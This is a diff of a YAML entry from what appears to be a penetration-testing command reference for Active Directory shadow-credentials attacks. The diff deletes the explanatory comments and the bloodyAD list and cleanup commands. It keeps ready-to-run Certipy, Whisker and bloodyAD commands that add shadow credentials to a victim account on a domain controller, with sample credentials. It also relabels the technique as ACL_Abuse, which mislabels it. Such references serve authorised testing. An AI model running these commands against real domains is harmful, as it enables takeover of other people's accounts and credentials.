@@ -4,20 +4,9 @@ description: |
 commands:
   - have: Credentials
     cmd: |
-      # Certipy — shadow credentials auto exploitation
       certipy shadow auto -target dc01.senshu.sh -u sec_user@senshu.sh -p 'P@ssw0rd' -account victim
-
-      # Whisker — add shadow credentials (Windows)
       .\Whisker.exe add /target:victim /domain:senshu.sh /dc:dc01.senshu.sh
-
-      # bloodyAD — add shadow credentials
       bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add shadowCredentials victim
-
-      # bloodyAD — list shadow credentials
-      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get shadowCredentials victim
-
-      # bloodyAD — remove shadow credentials (cleanup)
-      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 remove shadowCredentials victim
 phase:
   - Exploitation
 target_os:
@@ -25,7 +14,7 @@ target_os:
 services:
   - LDAP
 techniques:
-  - Shadow_Credentials
+  - ACL_Abuse
 references:
   - https://github.com/ly4k/Certipy
   - https://github.com/eladshamir/Whisker
